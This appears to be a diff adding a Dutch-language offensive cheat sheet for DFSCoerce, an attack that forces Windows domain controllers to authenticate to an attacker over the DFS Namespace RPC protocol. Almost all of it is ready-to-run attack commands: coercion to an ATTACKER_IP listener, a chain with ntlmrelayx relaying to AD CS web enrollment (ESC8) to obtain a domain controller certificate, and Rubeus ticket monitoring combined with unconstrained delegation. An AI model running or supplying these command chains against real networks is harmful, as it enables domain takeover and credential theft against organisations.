@@ -1,0 +1,35 @@
+# DFSCoerce — MS-DFSNM (Distributed File System) coercion
+# Forceert NTLM authenticatie via het DFS Namespace Management protocol
+# Alternatief coercion pad wanneer MS-EFSR (PetitPotam) gepatcht is
+#
+# === Vereisten ===
+# - DFS Namespace service op het doelwit (standaard op DCs)
+# - Netwerk toegang via RPC
+#
+# === Syntax ===
+# DFSCoerce-andrea.exe -t <doelwit> -l <listener>
+# python3 dfscoerce.py -u USER -p PASS -d DOMAIN <listener> <doelwit>
+#
+# === Voorbeelden ===
+
+# Windows binary
+DFSCoerce-andrea.exe -t DC -l ATTACKER_IP
+
+# Python versie (impacket-stijl)
+python3 dfscoerce.py -u USER -p 'PASS' -d DOMAIN ATTACKER_IP DC
+
+# Combinatie met ntlmrelayx voor ADCS relay (ESC8)
+# Terminal 1:
+python3 ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# Terminal 2:
+python3 dfscoerce.py -u USER -p 'PASS' -d DOMAIN ATTACKER_IP DC
+
+# Combinatie met unconstrained delegation
+# Monitor op DC TGT:
+Rubeus.exe monitor /interval:5 /nowrap
+# Trigger coercion:
+DFSCoerce-andrea.exe -t DC -l UNCONSTRAINED_HOST
+
+# Noot: Gebruikt NetrDfsRemoveStdRoot en NetrDfsAddStdRoot RPC calls
+# Noot: Download: https://github.com/Wh04m1001/DFSCoerce
+# Noot: Complementair aan PetitPotam, PrinterBug, WSPCoerce
